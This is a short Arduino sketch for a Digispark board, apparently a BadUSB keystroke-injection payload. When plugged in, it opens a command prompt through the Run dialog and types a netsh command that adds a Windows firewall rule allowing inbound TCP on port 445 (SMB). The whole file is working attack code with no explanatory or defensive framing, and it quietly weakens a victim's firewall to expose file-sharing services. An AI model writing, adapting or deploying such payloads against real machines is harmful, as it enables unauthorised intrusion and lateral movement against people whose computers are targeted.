#include "DigiKeyboard.h"
#define KEY_ESC     41
#define KEY_BACKSPACE 42
#define KEY_TAB     43
#define KEY_PRT_SCR 70
#define KEY_DELETE  76

void setup() 
{
DigiKeyboard.delay(5000);
DigiKeyboard.sendKeyStroke(0);
DigiKeyboard.delay(5000);
DigiKeyboard.sendKeyStroke(KEY_M,MOD_GUI_LEFT);
DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
DigiKeyboard.delay(500);
DigiKeyboard.print(F("cmd"));
DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(500);
DigiKeyboard.print(F("netsh advfirewall firewall add rule name=")); 
DigiKeyboard.print(char(34)); 
DigiKeyboard.print(F("open445")); 
DigiKeyboard.print(char(34)); 
DigiKeyboard.print(F(" dir=in protocol=tcp localport=445 action=allow"));
DigiKeyboard.sendKeyStroke(KEY_ENTER);

}


void loop() 
{

}